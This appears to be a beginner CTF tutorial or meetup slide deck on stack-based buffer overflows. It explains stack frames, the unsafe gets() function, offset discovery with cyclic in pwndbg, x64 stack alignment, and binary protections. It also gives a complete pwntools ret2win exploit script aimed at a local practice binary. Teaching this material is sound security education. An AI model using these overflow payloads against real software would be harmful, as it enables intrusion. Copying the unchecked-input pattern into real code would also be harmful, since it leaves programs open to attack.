What is a Binary & PWN?

Bridging source code to CPU machine instructions

From Code to Machine Language

A binary is a compiled executable containing machine instructions that the CPU processes directly (e.g. Linux ELF, Windows PE). 

Source Code (.c)
   │
   ▼  [gcc -o program main.c]
Assembly Code (.s)
   │
   ▼  [Assembler & Linker]
Machine Code / Binary ELF (0s & 1s)

CPUs have no awareness of C variables, buffer boundaries, or data types. They execute linear instruction streams reading and writing raw memory addresses.

What is Binary Exploitation (PWN)?

Unlike web or crypto challenges where you inspect source code or cryptographic algorithms, PWN operates at the lowest level: assembly, memory layout, and registers.

  • 🎯
    Find the Buffer Overflow: Locate an unconstrained memory read function (e.g. gets()).
  • 📐
    Calculate the Offset: Determine exactly how many bytes are needed to reach the return address.
  • 🚩
    Hijack Control Flow: Overwrite the return address to jump to win() / get_flag().

The Stack

RW- (Read / Write)

The Stack manages function call frames, local variables (e.g. char buffer[64]), and return addresses. It grows downward from high addresses to low addresses in memory.

⚔️ Exploitation Role

Target of Stack-Based Buffer Overflows. Writing past local buffers spills into Saved RBP and the Return Address (RIP/EIP), redirecting execution to any function we choose!

Anatomy of a Stack Frame

Why writing past a local variable reaches the return address

Function Call Lifecycle

  1. `call function`: CPU pushes the current next-instruction address (Return Address) onto the stack.
  2. Prologue: Function saves the caller's base pointer (push rbp; mov rbp, rsp).
  3. Allocation: Space is reserved for local variables by decrementing RSP (sub rsp, 0x40).
  4. Epilogue & `ret`: Function cleans up frame (leave) and executes ret (which pops the Return Address into RIP).

The Key Conflict:

The Stack grows downward (High ➔ Low Address), but buffers are filled upward (Low ➔ High Address toward the Return Address)!

Vulnerable C Functions

The dangerous functions that make buffer overflows possible

The Notorious gets() Function

#include <stdio.h>

void vulnerable() {
    char buffer[64];

    printf("Enter your input: ");
    fflush(stdout);
    gets(buffer);  // ❌ NO LENGTH CHECKING!

    printf("You entered: %s\n", buffer);
}

gets() reads from standard input until a newline character is encountered. It never checks the destination buffer size, allowing attackers to write an arbitrary number of bytes directly into the stack.

Dangerous vs Safe Functions

❌ Dangerous ✅ Safe Alternative Root Cause
gets(buf) fgets(buf, sizeof(buf), stdin) Reads infinitely until newline
strcpy(dst, src) strncpy(dst, src, n) Copies until null-byte without bounds
sprintf(buf, ...) snprintf(buf, n, ...) Unbounded format string output
scanf("%s", buf) scanf("%63s", buf) Missing maximum field width

Finding Offsets: cyclic & pwndbg

Never guess offsets — determine exact distances mathematically

The 3-Step cyclic Methodology

  1. 1. Generate a unique De Bruijn sequence: 
    pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaj...
  2. 2. Run the binary in GDB and input the sequence: 
    pwndbg> run
Enter your input: [paste pattern]
Program received signal SIGSEGV (fault on 0x6161616a)
  3. 3. Query cyclic to calculate the exact offset: 
    pwndbg> cyclic -l 0x6161616a
Finding cyclic pattern of length 4: b'jaaa'
Found at offset 72

Offset Differences: Assembly vs Cyclic

In Danish's writeup, we see two ways to determine the offset:

  • A. Decompilation / Assembly Inspection:
    In Ghidra/GDB: Local buffer (64B) + compiler saved registers (e.g. EBX/RBP) = Exact distance to the return address.
  • B. Dynamic Crash Analysis (cyclic -l):
    Every 4-byte (32-bit) or 8-byte (64-bit) chunk in a cyclic string is unique. Whatever crashes the instruction pointer reveals the exact offset immediately!

Hands-On Practice: x64 & The Stack Trap

Walkthrough from writeup: `handson/x64/challenge`

Offset in x64: 64B buffer + 8B Saved RBP = 72 bytes. 

# Initial naive payload:
payload = b'A' * 72 + p64(win_address)

# Result: Program crashes with SIGSEGV inside puts/printf!
pwndbg> r
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c80035 in _IO_puts () ... movaps [rsp+...], xmm0

The 16-byte Stack Alignment Requirement:

  • The System V x86-64 ABI requires RSP to be a multiple of 16 (RSP % 16 == 0) before executing any call instruction.
  • GLIBC's printf and puts use SSE instructions like movaps that crash if the memory address is not 16-byte aligned!
  • When our exploit jumps directly to win(), RSP ends with 8, triggering a crash!

The Solution: Add a dummy ret instruction! 

# 1. Find a ret gadget
ret_gadget = ROP(elf).find_gadget(['ret'])[0]  # 0x401016

# 2. Add to payload:
payload = b'A' * 72
payload += p64(ret_gadget)   # Pops 8 bytes, aligning RSP to 16!
payload += p64(win_address)  # Now calls win() safely!

Complete x64 Solution (solve.py)

from pwn import *

elf = ELF('./challenge')
context.binary = elf

offset = 72
win_address = elf.symbols['win']
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

payload = b'A' * offset
payload += p64(ret_gadget)   # Align stack
payload += p64(win_address)  # Jump to win()

p = process('./challenge')
p.sendlineafter(b'input: ', payload)
p.interactive()
# Output: FLAG{x64_r3t2w1n_b4s1cs}

Architecture Summary: x86 vs x64

Key technical differences summarized directly from the writeup

Feature / Attribute x86 (32-bit) x64 (64-bit)
Hands-on Offset 76 bytes (64B + 4B EBX + 4B EBP) 72 bytes (64B + 8B RBP)
Register to Inspect in GDB EIP (shows corrupted address directly) RSP (top of stack holds corrupted ret addr)
Pointer / Address Size 4 bytes (p32() or pack()) 8 bytes (p64() or pack())
Function Arguments Pushed onto the stack in reverse order Passed in registers: RDI, RSI, RDX, RCX, R8, R9
16-byte Stack Alignment Not strictly required Strictly enforced by GLIBC (movaps)
Extra Gadget Needed No gadget required Yes (ret gadget required for alignment)

Binary Protections: checksec

Modern defenses designed to stop memory exploitation

checksec Output

$ checksec --file=./challenge
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

In our meetup challenges, No Canary and No PIE allow us to overwrite RIP with fixed function addresses directly.

Mitigation Matrix

  • NX / DEP (No-Execute):
    Marks stack non-executable. Stops injected shellcode, but does NOT stop ret2win or ROP.
  • Stack Canary:
    Random value before Saved RBP. If overwritten, triggers __stack_chk_fail and aborts before ret.
  • PIE (Position Independent Executable):
    Randomizes binary base address every run. Requires address leaks to bypass.
  • ASLR (Address Space Layout Randomization):
    Kernel feature randomizing stack, heap, and library (libc) bases.

Apple Silicon Setup: Colima & Ghidra

Zero lag, low battery: macOS Ghidra + Colima x86_64 execution

Split Architecture Benefit

  • ⚡
    Native macOS Ghidra: Zero GUI cursor lag, full hardware acceleration, retina resolution (brew install ghidra).
  • 🐧
    Headless Colima (QEMU x86_64): Only ~2GB RAM vs 8GB+ for full Kali VM.
  • 🔄
    Shared Filesystem: Files in macOS are automatically mounted inside Colima at /Users/...!
